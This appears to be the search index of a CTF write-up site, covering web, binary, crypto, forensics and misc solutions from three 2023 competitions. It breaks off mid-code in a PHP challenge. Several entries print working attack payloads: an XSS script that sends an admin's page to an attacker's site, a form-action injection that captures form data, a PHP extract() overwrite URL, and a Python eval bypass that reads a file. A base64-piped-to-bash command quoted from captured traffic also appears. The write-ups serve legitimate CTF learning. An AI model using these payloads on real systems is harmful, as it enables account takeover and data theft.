{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":"<p>This site contains every writeup of every CTF I've partecipated since 2023.</p>"},{"location":"#github-repositories","title":"Github Repositories","text":"<ul> <li><code>m0leCon CTF 2023</code> \u00a0- \u00a0I haven't made any writeup for this CTF.</li> <li><code>TFC CTF 2023</code> \u00a0- \u00a0Repository site \u00a0 - \u00a0 <code>11th position with ZenHack</code></li> <li><code>nullCon HackIm CTF2023</code> \u00a0 - \u00a0 Respository site \u00a0 - \u00a0 <code>13th position with Paolo</code></li> <li><code>SekaiCTF 2023</code> \u00a0- \u00a0 No repository \u00a0 - \u00a0 <code>122th position with Paolo</code></li> <li><code>Square CTF 2023</code> \u00a0- \u00a0 No repository \u00a0 - \u00a0 <code>115th position with Paolo</code></li> <li><code>m0leconCTF Beginner 2023</code> \u00a0- \u00a0 Repository site \u00a0 - \u00a0 <code>6th position with Paolo</code></li> <li><code>To be continued</code>\u00a0 - \u00a0To be continued</li> </ul>"},{"location":"#useful-tools","title":"Useful tools","text":""},{"location":"#binary","title":"Binary","text":"Name Site Repository Documentation Installation <code>Ghidra</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs Check the repository <code>IDA</code> :material-check-all: Site :material-close: No repository :material-check-all: Docs Check the site <code>gdb</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs <code>sudo apt install gdb</code> <code>pwndbg</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs Check the repository <code>pwntools</code> :material-close:     No site :material-check-all: Repository :material-check-all: Docs <code>pip install pwntools</code> <code>ltrace</code> :material-check-all:     Site :material-check-all: Repository :material-check-all: <code>man ltrace</code> <code>sudo apt install trace</code>"},{"location":"#web-security","title":"Web security","text":"Name Site Repository Documentation Installation <code>Burp Suite</code> :material-check-all: Site :material-close: No repository :material-check-all: Docs Check the site <code>Selenium</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs <code>pip install selenium</code> <code>Requests</code> :material-close:     No site :material-check-all: Repository :material-check-all: Docs <code>pip install requests</code> <code>dirsearch</code> :material-close:     No site :material-check-all: Repository :material-check-all: Docs <code>pip install dirsearch</code> <code>Postman</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs Check the site"},{"location":"#cryptography","title":"Cryptography","text":"Name Site Repository Documentation Installation <code>Pycryptodome</code> :material-close:     No site :material-close: No repository :material-check-all: Docs <code>pip install pycryptodome</code> <code>Sagemath</code> :material-check-all: Site :material-close: No repository :material-check-all: Docs Check the site <code>Mtp</code> :material-close:     No site :material-check-all: Repository :material-check:     Check the repository <code>pip install mtp</code> <code>RsaCTFTool</code> :material-close:     No site :material-check-all: Repository :material-check:     Check the repository Check the repository"},{"location":"#miscellaneous","title":"Miscellaneous","text":"Name Site Repository Documentation Installation <code>Wireshark</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs <code>sudo apt install wireshark</code> <code>Zsteg</code> :material-close:     No site :material-check-all: Repository :material-check-all: Check the repository Check the repository <code>Stegsolve</code> :material-close:     No site :material-close:     No repository :material-close:     No documentation Installation <code>Gimp</code> :material-check-all: Site :material-check-all: Repository :material-check-all: Docs Check the site"},{"location":"TFCCTF-2023/","title":"TFC CTF 2023","text":""},{"location":"TFCCTF-2023/#web","title":"Web","text":""},{"location":"TFCCTF-2023/#baby-ducky-notes","title":"Baby Ducky Notes","text":"<p>This challenge looked like a normal notes sharing site, but after a quick view to the source code, it was easy to find the way to read the flag. In fact the <code>database.db</code> file had a query to initialize the notes table with this code:  <pre><code>query(con, f''' \nINSERT INTO posts (\n    user_id,\n    title,\n    content,\n    hidden\n    ) VALUES (\n        1,\n        'Here is a ducky flag!',\n        '{os.environ.get(\"FLAG\")}',\n        0\n);\n''')\n</code></pre> This could only means that the flag wasn't hidden and the easiest way to find it was to make a GET request to the url <code>http://challs.tfcctf.com:port/posts/view/admin</code> and the flag was in fact right there.</p>"},{"location":"TFCCTF-2023/#baby-ducky-notes-revenge","title":"Baby Ducky Notes: Revenge","text":"<p>Now the challenge was a bit more difficult than the previous one because the flag was hidden and the only way to read it was to make the admin read it for me or by stealing the admin's cookie which was HttpOnly. After looking for a while in the source code, I found a line from the template of the posts page: <pre><code>&lt;ul class=\"posts_ul\"&gt;\n    {% for post in posts %}\n    &lt;li&gt;\n        &lt;div class=\"blog_post\"&gt;\n            &lt;div class=\"container_copy\"&gt;\n                &lt;h1&gt; {{post.get('title')}} &lt;/h1&gt;\n                &lt;h3&gt; {{post.get('username')}} &lt;/h3&gt;\n                &lt;p&gt; {{post.get('content') | safe}} &lt;/p&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/li&gt;\n    {% endfor %} \n&lt;/ul&gt;\n</code></pre> The content was rendered without any sanitizing and because of that I could perform an XSS using this payload <pre><code>&lt;script&gt;\nasync function attack(){\n    var xhr = new XMLHttpRequest();\n    xhr.open(\"GET\", \"/posts/view/admin\", true);\n    xhr.responseType = \"text\";\n    xhr.onload = () =&gt; {\n        window.location.href = \"{input('Enter the url of your site: ')}?html=\" + btoa(xhr.responseText.toString());\n    };\n    await xhr.send(null);\n}\nattack();\n&lt;/script&gt;\n</code></pre> After executing this code the admin could read its notes (including the flag) and send the whole html code encrypted in base64 to my website where I had to decrypt it to find the flag.</p>"},{"location":"TFCCTF-2023/#cookie-store","title":"Cookie Store","text":"<p>I really hated this challenge for a while because I couldn't run the javascript code of the page (which was quite important) because of an error of the <code>setHTML</code> javascript function which only worked when the site was running as <code>localhost</code> or with an <code>https</code> connection. I later found out a way to run docker as <code>localhost</code> (it initially used the local ip 172.17.x.x) but even if I spent a lot of time to resolve this problem, the challenge was quite interesting, in fact this site printed our 'notes' using some columns sorting method that was vulnerable. <pre><code>const urlParams = new URLSearchParams(window.location.search);\nconst fields = urlParams.get('fields');\n\nlet form_html = '';\nlet fields_list = [];\nif (fields) {\n    fields_list = fields.split(',');\n    fields_list.forEach(element =&gt; {\n        form_html += `&lt;div class=\"mb-4\"&gt;\n            &lt;label for=\"${element}\" ... &gt;${element}&lt;/label&gt;\n            &lt;input type=\"text\" name=\"${element}\" id=\"${element}\" ...&gt;\n        &lt;/div&gt;`;\n    });\n}\n// This will sanitize the input\ndocument.querySelector('#form_builder').setHTML(form_html);\n\n...\n</code></pre> This code in fact injects the input wihout any check in the html source code, then it removes any javascript script or method like <code>onerror</code> or <code>onload</code> before writing it in the page. This code is vulnerable because if I send this payload as a field <pre><code>\"&gt;&lt;input type=\"submit\" formaction=\"our site\" id=\"pwned\"&gt;&lt;label name=\"\n</code></pre> I can redirect the form data from the cookie store to my site and then read the flag that the admin wrote in the title field.</p>"},{"location":"TFCCTF-2023/#mctree","title":"MCTree","text":"<p>This challenge was really easy but, I was tired (just a lot of skill issue) and I couldn't understand the vulnerability during the CTF (sorry ZenHack) but anyway, the challenge didn't have any source code to download. In fact it was only a site where you could register, login and, if after the login you had the admin username, you could achive the flag. After a few attempts I saw that the challenge always removed any character like <code>{}&lt;&gt;[]'\"</code> so the payload was to send a username like <code>{admin</code> so that the site could accept our request because the username was different from <code>admin</code> and after a sanitizing our username was <code>admin</code> anyway. And that's it lol :).</p>"},{"location":"TFCCTF-2023/#binary","title":"Binary","text":""},{"location":"TFCCTF-2023/#diary","title":"Diary","text":"<p>This challenge was really nice and easy because it had RWX segments in it, no PIE and also hadn't any canary. <pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    No canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre> It had an important funciton <code>vuln</code> which only read 1024 chars in a 256 bytes long buffer, where I could perform an overflow to change the return pointer to another address <pre><code>fgets((char *)&amp;local_108,0x400,stdin);\n</code></pre> After using <code>ropgadgets</code> to find a useful code, I found a nice instruction <pre><code>call rax\n</code></pre> so the only thing that I had to do was to make a shellcode using the <code>shellcraft</code> module of pwntools to create a shellcode and then call it by changing the return pointer to the shellcode address.</p>"},{"location":"TFCCTF-2023/#shello-world","title":"Shello-World","text":"<p>This challenge is exactly the same of <code>Diary</code>, but in this one there is no buffer overflow to perform, because now the <code>vuln</code> function is the following <pre><code>fgets((char *)&amp;local_108,0x100,stdin);\nprintf(\"Hello, \");\nprintf((char *)&amp;local_108);\nputchar(10); // (chr)(10) == '\\n' =&gt; true\n</code></pre> This is pretty different from diary but still vulnerable as there's a format string vulnerability because the source file calls a <code>printf</code> without set any format string which means that we can use the <code>fmtstr_payload</code> function from pwntools to write a payload which replaces the address of the function <code>exit</code> from the GOT with the address of the <code>win</code> function that will open a shell on the remote machine.</p>"},{"location":"TFCCTF-2023/#random","title":"Random","text":"<p>If you give a quick look at this challenge it doesn't seem to be really vulnerable, but if you look at the call of the <code>sran</code> function in the decompiled section of your tool, you can easily see something that looks like this <pre><code>srand(time(NULL));\n</code></pre> which can be easily reproduced in python by using the <code>ctypes</code> library. So the exploit was to reproduce all the numbers generated by the seeded random function of the source file using a python script and than send them to the container to recive the flag.</p>"},{"location":"TFCCTF-2023/#forensics","title":"Forensics","text":""},{"location":"TFCCTF-2023/#list","title":"List","text":"<p>This challenge provided a file with a lot of http comunications always with the status code <code>404</code> or <code>403</code> when the client tries to get some 'random' directories. This is obviusly a bruteforce of the URIs directories that was performed using a tool like <code>gobuster</code> or <code>dirsearch</code>. Once I noticed this, I filtered all the responses by removing all those which had the status code <code>404</code> or <code>403</code>. This showed me some packets that looked like a response to a reverse shell command. <pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> This could only mean that somewhere in the file there was a command executed by the attacker. In fact after a while I found out that there were a lot of packets that were HTTP POST requests, all with the same length (756 bytes) and with the same paylaod. <pre><code>echo \"ZmluZCAvaG9tZS9jdGYgLXR5cGUgZiAtbmFtZSAifSIgMj4vZGV2L251bGw=\" | base64 -d | bash\n</code></pre> This is in fact a bash command encoded in base64 and this is what I got after I decoded it <pre><code>find /home/ctf -type f -name \"T\" 2&gt;/dev/null\n</code></pre> and later I did the same on the next packet where I got the same payload with a little change <pre><code>find /home/ctf -type f -name \"F\" 2&gt;/dev/null\n</code></pre> So the flag was just splitted in many different commands and the only thing left to do was to write a script to get by using a regex filter.</p>"},{"location":"TFCCTF-2023/#some-traffic","title":"Some Traffic","text":"<p>This challenge required much more time than the previous one because it also had some normal http packets that were just requests and responses of the upload of three images to a website. After I've extracted all the images I tried to see what could be hidden in all the files, but I didn't find anything suspicious. However, the first image had three columns of green pixels that seemed to be a type of hidden data. <pre><code>(1, 84, 1)\n(1, 70, 1)\n(1, 67, 1)\n(1, 67, 1)\n(1, 84, 1)\n(1, 70, 1)\n(1, 123, 1)\n</code></pre> This was the result when I tried to extract the RGB values of each pixel of each colum: the Red value was always 1 and it was the same for the Blue value, but the Green one seemed to be an ASCII value. As a matter of fact they were just the format of the flag <code>TFCCTF{</code> hidden in the pixels.</p>"},{"location":"TFCCTF-2023/#mcteenx","title":"MCTeenX","text":"<p>This challenge was really interesting because it provided a zip file protected by a password that I couldn't bruteforce using a dictionary attack. It only had one file zipped in it that was a <code>.sh</code> file that normally has as first line like this  <pre><code>#!/bin/sh\n</code></pre> Since I knew part of the file text I could try a Plaintext Attack using <code>bkcrack</code> by executing this command <pre><code>bkcrack -C src.zip -c script.sh -p temp_file.sh\n</code></pre> (the <code>temp_file.sh</code> file was just the known plaintext). Luckily this tool could extract the <code>script.sh</code> file that seemed to be just an echo of an encoded base64 text piped in the file <code>red.png</code>. The first thing that popped up into my head was to analyze it using <code>zsteg</code> which found different things, but the most suspicious one was an hexadecimal text which, if decoded, appeared to be random bytes. <code>030a111418142c783b39380d397c0d25293324231c66220d367d3c23133c6713343e343b3931</code> After a few tries I attempted to xor it with the flag format <code>TFCCTF{</code> which gave me back a string like this <code>WLRWLRW</code>. I then repetead this string until I filled the whole length of the hex string and I xored it again to see what I could get. Even if the first try went wrong because I mistyped the string, the following one decrypted the flag.</p>"},{"location":"TFCCTF-2023/#cryptography","title":"Cryptography","text":""},{"location":"TFCCTF-2023/#dizzy","title":"Dizzy","text":"<p>Dizzy<sup>1</sup> was the first challenge of the cyrpto section and it had this output <pre><code>T4 l16 _36 510 _27 s26 _11 320 414 {6 }39 C2 T0 m28 317 y35 d31 F1 m22 g19 d38 z34 423 l15 329 c12 ;37 19 h13 _30 F5 t7 C3 325 z33 _21 h8 n18 132 k24\n</code></pre> after thinking what this could mean, I saw that a few pairs were somehow suspicious<code>T0 F1 C2 C3 T4 F5 {6</code> Later I understood that all the pairs where just <code>char:position</code> randomly mixed, and after I've written a quick script (just look the <code>normal_solution</code> function in the solve script) I found the whole flag.</p>"},{"location":"TFCCTF-2023/#mayday","title":"Mayday","text":"<p>Like the previous one, this challenge had this output <pre><code>Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven\n</code></pre> which was just the NATO alphabet and the solution was just to map every word to a character (or number) to find the flag. P.S. The flag was in the format <code>TFCCTF{FOUND_TEXT}</code></p>"},{"location":"TFCCTF-2023/#alien-music","title":"Alien Music","text":"<p>This challenge was just pure guessing, but the solution was the easiest one in the crypto section, it had this output <pre><code>DC# C#D# C#C C#C DC# C#D# E2 C#5 CA EC# CC DE CA EB EC# D#F EF# D6 D#4 CC EC EC CC# D#E CC E4\n</code></pre> After analyzing it for a while, I tried to connect the first pairs to the format <code>TFCCTF{</code> and I tought that the connection could be: <pre><code>ord('T') =&gt; 0x54 =&gt; {'D' : 5, 'C#' : 4}\nord('F') =&gt; 0x46 =&gt; {'C#' : 4, 'D#' : 6}\nord('C') =&gt; 0x43 =&gt; {'C#' : 4, 'C' : 3}\n</code></pre> I tried to map all the pairs in this python dictionary :  <pre><code>d = {\n    \"A\": \"0\", \"A#\" : \"1\", \"B\" : \"2\", \"C\" : \"3\",  \"C#\" : \"4\", \n    \"D\": \"5\", \"D#\" : \"6\", \"E\" : \"7\", \"F\" : \"8\", \"F#\" : \"9\", \n    \"1\": \"a\", \"2\" : \"b\", \"3\" : \"c\", \"4\" : \"d\", \"5\" : \"e\", \"6\" : \"f\"\n}\n</code></pre> and after that I wrote a quick script, I found the whole flag.</p>"},{"location":"TFCCTF-2023/#rabid","title":"Rabid","text":"<p>Rabid had a 'little' hint in the text which said that they wrote a little 'extra' information in the message, in fact the output ... <pre><code>VEZDQ1RGe13kwdV9yNGIxZF9kMGc/IT8hPyE/IT8hPi8+Pz4/PjEyMzkwamNhcHNrZGowOTFyYW5kb21sZXR0ZXJzYW5kbnVtYmVyc3JlZWVlMmozfQ==\n</code></pre> was a base64 encoded message with an encoded prefix that was the format <code>TFCCTF{</code> and the only way to find the remaining flag was just to remove from the base64 message the encoded message <code>TFCCTF{</code> and decode it again.</p>"},{"location":"TFCCTF-2023/#aes-ctf-tool-v1","title":"AES CTF Tool V1","text":"<p>To solve this challenge the easiest way was to install the tool that the admins wrote just for that challenge and execute the <code>main.py</code> file. <pre><code>alan@ubuntu:~$ python3 main.py\n[INFO] Starting initial cryptanalysis.\n[INFO] Starting initial cryptanalysis.\n[INFO] Determining block size.\n[X] Found block size: 16.\n[INFO] Determining block chiper category.\n[X] Found block cipher category: ECB_CBC.\n[INFO] Starting fingerprinting.\n[INFO] Determining block cipher mode.\n[X] Found block cipher mode: ECB.\n======= Probabilities =======\nECB: 100%\nCBC: 0%\nCFB: 0%\nOFB: 0%\nCTR: 0%\n=============================\n[INFO] ECB/CBC detected. Determining padding method.\n[X] Found padding method: Block.\n[INFO] Fingerprinting complete.\nWould you like to perform a Chosen Plaintext Attack? (Y/n) Y\nY\n\nOptimize search space for printable ascii? (Y/n) Y\nY\n\n[INFO] Starting Chosen Plaintext Attack.\nOffset: 8 bytes\nBlock number: 7\nFound: T\nFound: TF\nFound: TFC\nFound: TFCC\nFound: TFCCT\nFound: TFCCTF\nFound: TFCCTF{\n...\n</code></pre></p>"},{"location":"TFCCTF-2023/#aes-ctf-tool-v2","title":"AES CTF Tool V2","text":"<p>This challenge was exactly like the previous one but the tool also required to pass it an encrypted chipertext to decrypt. <pre><code>alan@ubuntu:~$ python3 main.py\n[INFO] Starting initial cryptanalysis.\n[INFO] Starting initial cryptanalysis.\n[INFO] Determining block size.\n[X] Found block size: 16.\n[INFO] Determining block chiper category.\n[X] Found block cipher category: ECB_CBC.\n[INFO] Starting fingerprinting.\n[INFO] Determining block cipher mode.\n[X] Found block cipher mode: CBC.\n======= Probabilities =======\nCBC: 100%\nECB: 0%\nCFB: 0%\nOFB: 0%\nCTR: 0%\n=============================\n[INFO] ECB/CBC detected. Determining padding method.\n[X] Found padding method: Block+.\n[INFO] Checking if the IV is reused for each encryption.\n[INFO] Reuses IV: True.\n[INFO] Fingerprinting complete.\nWould you like to perform a Padding Oracle Attack? (Y/n) Y\nY\n\n[INFO] Starting Padding Oracle Attack.\nEnter the ciphertext to decrypt (in hexadecimal): 4a1e62c51fd9e5f79919...\nFound byte: 84\nIntermediate value: 85\nFound byte: 247\nIntermediate value: 245\nFound byte: 214\nIntermediate value: 213\nFound byte: 159\nIntermediate value: 155\n...\n</code></pre></p>"},{"location":"TFCCTF-2023/#miscellaneous","title":"Miscellaneous","text":""},{"location":"TFCCTF-2023/#discord-shenanigans-v3","title":"Discord Shenanigans V3","text":"<p>This challenge was just pure trolling because the flag was in the discord bot logo of the ctf server.</p>"},{"location":"TFCCTF-2023/#my-first-calculator","title":"My First Calculator","text":"<p>I actually didn't solved this challenge during the CTF because I didn't know the existence of this exploit that I'm going to explain (credits dp_1). Python is just a 'misterious' programming language that has some strange vulnerabilities where it comes to strings. This challenge provided a python file like this <pre><code>import sys\nprint(\"This is a calculator\")\ninp = input(\"Formula: \")\nsys.stdin.close()\nblacklist = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.\"\n\nif any(x in inp for x in blacklist):\n    print(\"Nice try\")\n    exit()\n\nfns = {\n    \"pow\": pow\n}\nprint(eval(inp, fns, fns))\n</code></pre> The exploit consisted in sending a payload written in italic that just could bypass the blacklist and than could read the flag doing something like this  <pre><code>''.join(i for i in open(\"flag\", \"r\"))\n</code></pre></p> <ol> <li> <p>The best writeup is Dizzy (OII based)\u00a0\u21a9</p> </li> </ol>"},{"location":"m0leconCTF-beginner2023/","title":"m0lecon CTF 2023 Beginner","text":""},{"location":"m0leconCTF-beginner2023/#web","title":"Web","text":""},{"location":"m0leconCTF-beginner2023/#unguessable","title":"Unguessable","text":"<p>This challenge was the easiest in the CTF (it had more solves than the sanity check, lol). In fact, to solve it, all you had to do was understand that the website fetched the flag from an endpoint <code>/vjfYkHzyZGJ4A7cPNutFeM/flag</code>, and to obtain it we ~~opened the endpoint~~ sniffed the whole network.</p> <pre><code>...\nfunction update(res) { // the function used by the site to get the flag\n    if (res === \"wrong\") {\n    card.style.backgroundColor = \"red\";\n    text.innerText = \"Wrong, try again\";\n    } else {\n    card.style.backgroundColor = \"green\";\n    fetch(\"/vjfYkHzyZGJ4A7cPNutFeM/flag\")\n        .then((response) =&gt; response.text())\n        .then((str) =&gt; {\n        text.innerText = str\n        });\n    }\n\n    card.removeAttribute(\"hidden\");\n}\n...\n</code></pre>"},{"location":"m0leconCTF-beginner2023/#secure-access","title":"Secure Access","text":"<p>The challenge had an attachment, a Python bytecode file (.pyc), which once decompiled, resulted in this function: <pre><code>def generate_token(nonce: str):\n    username = 'user001'\n    secret = hashlib.sha256(username.encode() + nonce.encode()).hexdigest()\n    bundle = {'user':username, 'secret':secret}\n    return base64.b64encode(json.dumps(bundle).encode())\n</code></pre></p> <p>The challenge required an username (obviously <code>admin</code>) and an access token that could be calculated using a nonce provided to the endpoint <code>/stage2?username=admin</code>. Once the token was calculated using the previously mentioned function, all that was needed to obtain the flag was to send the token and automatically gain access to the admin panel.</p> <p></p>"},{"location":"m0leconCTF-beginner2023/#piano-carriera","title":"Piano Carriera","text":"<p>For those who participated in the <code>m0lecon CTF beginner 2021</code> and remembered the Exam Booking challenge, they might recall the scenario where the user had to register for an exam when all available spots were already taken.</p> <p>In a similar way, this problem involves bypassing a client-side check that blocks the registration request. Once all the required data is obtained, the only thing left to do is to call the API to register and obtain the flag. The necessary parameters for this are <code>cod_ins</code> (20FWYOV), <code>cod_ins_padre</code> (29EBHOV), and <code>id_padre</code> (244355).</p> <p></p>"},{"location":"m0leconCTF-beginner2023/#cryptography","title":"Cryptography","text":""},{"location":"m0leconCTF-beginner2023/#fast-rsa","title":"Fast RSA","text":"<p>This time, the challenge requires decrypting the flag encrypted in RSA where <code>p - q = 4</code>. This, of course, is very vulnerable because if <code>p equals q</code> then it's easy to calculate the square root of the modulus N and then look for a value such that <code>N mod v = 0</code>. At this point, <code>v</code> will be <code>p</code> and <code>q</code> will be calculated by dividing the modulus by <code>q</code>. The problem can be then solved by calculating the key <code>d</code>.</p>"},{"location":"m0leconCTF-beginner2023/#and-cipher","title":"AND Cipher","text":"<p>This challenge required decrypting a cipher that used the bitwise AND operation. Obviously, this operation is not reversible, so one way to solve this problem is to make several requests to the API endpoint to obtain the encrypted flag each time with a different key.</p> <p>At this point, it's necessary to save the maximum value of the bytes for each position, and if a good bound is chosen, the flag will be found.</p> <pre><code>for _ in range(250):\n    json = requests.get(URL + \"api/encrypt\").json()\n    json = bytes.fromhex(json['encrypted'])\n    for i in range(26):\n        flag[i] = max(flag[i], json[i])\n</code></pre>"},{"location":"m0leconCTF-beginner2023/#crazyxor","title":"CrazyXOR","text":"<p>CrazyXOR provides an attachment containing source code that calculates the crazy XOR of 7 random numbers from <code>10^5</code> to <code>5*10^5</code>. It uses one of these numbers randomly to seed the random generator, which will then generate the key used to encrypt the flag.</p> <p><pre><code>def crazy_xor(x):\n    primes = prime_factors(x)\n    res = 0\n\n    for p1 in primes:\n        for p2 in primes:\n            if p1 &lt;= p2:\n                res = res ^ math.lcm(p1, p2) # Least common multiple\n\n    return res\n</code></pre> Once it's observed that the 7 iterations in the challenge meant to make brute-forcing the seed more complex are actually unnecessary, and that brute-forcing each x passed to the crazy XOR directly is sufficient, one just needs to emulate the various steps and check if decrypting the text yields the flag to complete this challenge as well.</p>"},{"location":"m0leconCTF-beginner2023/#polito-cheatbot","title":"PoliTO Ch(e)atbot","text":"<p>After a brief study of the challenge website, the objective became clear: encrypt the token <code>I'm Bob Masters, gimme the flag!</code> using the available AES-128 ECB tool. </p> <p>Initially, attempts were made to split the token into two 16-byte blocks and encrypt them separately. However, this approach failed because the webpage blacklisted the second block as it was. Through experimentation, it was observed that <code>'a' * 16</code> encrypted was the same as <code>'a' * 16 + 'b'</code>. This indicated that the tool was only encrypting the first 16 bytes of the inserted plaintext.</p> <p>Following this observation, to bypass the control, it was sufficient to write the second block concatenated with some random text. This action resulted in the encryption of the second block and consequently revealed the flag.</p> <p></p>"},{"location":"m0leconCTF-beginner2023/#politocheatbot-20","title":"PoliTOcheatbot 2.0","text":"<p>In this challenge, the objective is to encrypt a password using an OTP (One-Time Pad) unknown to us. After several attempts, we noticed that the tool encrypted any plaintext we sent and sent us back the XOR between the plaintext and a key like <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> (where obviously x stands for a printable ASCII character). After several other attempts, we observed that if initially the key was <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code>, in the subsequent encryption it became <code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</code>. Having made this observation, it was enough for us to calculate the key once to compute the next one and encrypt the password accordingly. Once the encrypted password was sent, we obtained the flag as expected.</p> <p></p>"},{"location":"m0leconCTF-beginner2023/#binary","title":"Binary","text":""},{"location":"m0leconCTF-beginner2023/#polito-pay-2-win","title":"Polito Pay 2 Win","text":"<p>Probably to solve Polito Pay 2 Win, the basic idea was to patch the binary/DLL provided in the challenge attachment to immediately purchase the flag. However, our idea (hopefully intended) was to open the <code>market.py</code> file to be able to see the flag in plaintext.</p>"},{"location":"m0leconCTF-beginner2023/#memory-wizard","title":"Memory Wizard","text":"<p>Memory Wizard has attached a <code>64-bit x86-64 ELF</code> binary that requests an address from which to read data and then prints it to the standard output.</p> <p>Analyzing the executable, it can be observed that both variables are declared on the stack with an 8-byte difference. Therefore, by using the leaked stack address, the flag address can be calculated like this <code>0xADDRESS + 8 = 0xFLAGADDRESS</code>.</p> <p></p>"},{"location":"m0leconCTF-beginner2023/#oursql","title":"OURsql","text":"<p>OURsql was one of the most interesting challenge in this CTF. It seems it was a binary that read a <code>database</code> ~~a text file~~ and used it for some queries.  Upon analysis, I noticed that when the maximum number of users was reached, the program began to overwrite users at the beginning of the list. This allowed me to overwriting the password of the user with the flag. The exploit in fact involved spamming registrations until the user with the flag was overwritten. Afterward, logging in would have solved the challenge.</p>"},{"location":"m0leconCTF-beginner2023/#the-wall","title":"The Wall","text":"<p>The Wall had an attachment, a 64-bit ELF file named <code>null_wall</code> (it will be useful later lol). Once decompiled, it provided approximately this result: </p> <p>Once decompiled, we looked at how the variables were arranged and noticed that the flag was located 20 bytes after our input pointer, preceded by a <code>null</code> byte. This null byte prevented the flag from being printed if fewer than 19 bytes were written. However, once exactly 19 bytes (<code>0x13 bytes</code>) were written, the flag was leaked. </p>"},{"location":"m0leconCTF-beginner2023/#miscellaneous","title":"Miscellaneous","text":""},{"location":"m0leconCTF-beginner2023/#strange-extension","title":"Strange Extension","text":"<p>So, this challenge was solved simply by opening the file attached to the challenge using this website, immediately obtaining the flag.  P.S.: Maybe it wasn't the cleanest way to resolve it but we did it anyway.</p>"},{"location":"m0leconCTF-beginner2023/#a-sky-full-of-5t4r5","title":"A sky full of 5t4r5","text":"<p>This time, the challenge contained an image (frighteningly heavy, about <code>211 MB</code>) that resembled this screenshot:  </p> <p>Once analyzed with ExifTool, it gave this result from which one can obviously notice the comment in the metadata of the photo which is <code>Some people say there is a question mark in this picture, can you find the flag near it?</code>  At this point, it was just a matter of looking around the photo for a while for a question mark (bottom right) to actually find the flag.</p>"},{"location":"m0leconCTF-beginner2023/#strangers-in-the-noise","title":"Strangers in the Noise","text":"<p>\"Strangers in the Noise\" contained the famous Frank Sinatra song \"Stranger in the Night\". While analyzing it, we didn't find much until we used this website and managed to notice letters in the spectrum of the song as it progressed. Once we obtained the entire flag still encrypted as <code>swp{v0p3wk1qj_1q_b0xu_h4u5_z4v_vr_4qq0b1qj}</code>, all we had to do was use a Caesar cipher decoder to obtain the final flag.</p> <p></p> <p>Here you can see the first part of the flag <code>sw</code>.</p>"},{"location":"nullCon-HackIM-CTF-2023/","title":"nullCon CTF 2023","text":""},{"location":"nullCon-HackIM-CTF-2023/#web","title":"Web","text":""},{"location":"nullCon-HackIM-CTF-2023/#typical-boss","title":"TYpical Boss","text":"<p>In this challenge, it was noticeable that if you accessed the main directory '/' of the challenge's website, the web server would render all the files and directories present on the page (including a file named <code>database.db</code>, which was an SQLite database). As soon as I found this file, I analyzed its contents until I discovered the hashed password of the admin. This hash (in SHA-1) started with a very famous prefix known for its vulnerabilities in PHP, namely <code>0e</code>. In fact, the password would be interpreted by PHP as a number, specifically <code>0</code>. The only way I had to bypass the login was to find a SHA-1 hash that also started with <code>0e</code>. This is one useful repository with a lot of these hashes: Repository</p>"},{"location":"nullCon-HackIM-CTF-2023/#debugger","title":"Debugger","text":"<p>Debugger to obtain the flag required your IP to be 127.0.0.0, which is not directly modifiable due to the fact that it used <code>$_SERVER['REMOTE_ADDR']</code>, using the following PHP code: <pre><code>&lt;?php\nif(isset($_GET['action']) &amp;&amp; $_GET['action']==\"debug\") {\n    $is_admin = $_SERVER['REMOTE_ADDR'] == \"127.0.0.0\" ? 1 : 0;\n    $debug_info = get_debug_info(extract($_GET['filters']));\n    if($is_admin) {\n        echo implode($debug_info, '\\n');\n    } else {\n        echo(\"Only local admins are allowed to debug!\");\n    }\n    include_once \"flag.php\";\n}\n?&gt;\n</code></pre> The vulnerability at this point lies in the PHP <code>extract()</code> function, which imports variables from an array into the current symbol table. My exploit, more precisely, involved overwriting the <code>$is_admin</code> variable with 1 by using the following payload in the GET request URL <code>/?action=debug&amp;filters[is_admin]=1</code> This way, I managed to obtain the flag.</p>"},{"location":"nullCon-HackIM-CTF-2023/#colorful","title":"Colorful","text":"<p>This challenge was notably different from the standard web challenges I'm familiar with, as it required knowledge of <code>AES</code> vulnerabilities in <code>ECB</code> mode. In this case, the source code contained a particularly suspicious section of code: <pre><code>def parse(self, c):\n    d = {}\n    if c is None:\n        return d\n    for p in c.split(\"&amp;\"):\n        try:\n            k,v = p.split(\"=\")\n            if not k in d:\n                d[k]=v\n        except:\n            pass\n    return d\n\ndef new_session(self, r):\n    id = secrets.token_hex(4)\n    c = f\"_id={id}&amp;admin=0&amp;color=ffff00&amp;\"\n    return self._c(c)\n\ndef _c(self, v):\n    try:\n        v = v.encode()\n        while len(v) % 16 != 0:\n            v += b'\\x41' \n        return AES.new(self.k,1).encrypt(v).hex()\n    except:\n        return None\n</code></pre> After looking at this code for a while, I noticed that it was possible to easily encrypt arbitrary blocks that, if crafted correctly, could be mixed together to create a cookie with admin privileges. At this point, what I did was fill the portion of the cookie that I couldn't modify myself, <code>_id={id}&amp;admin=0&amp;color=</code> (where id is a string of 4 * 2 hexadecimal characters), with characters at the end to make its length divisible by 16 (in other words, full blocks). Then, I wrote <code>admin=1</code> in the next block. This way, I could shift the last block to the beginning and overwrite the original cookie to obtain the flag.</p>"},{"location":"nullCon-HackIM-CTF-2023/#ip-filters","title":"IP Filters","text":"<p>This was IPFilters's source code: <pre><code>&lt;?php\n    function fetch_backend($ip) {\n        if(is_bad_ip($ip)) {\n            return \"This IP is not allowed!\";\n        }\n        return file_get_contents(\"http://\". $ip . \"/\");\n    }\n    function is_bad_ip($ip) 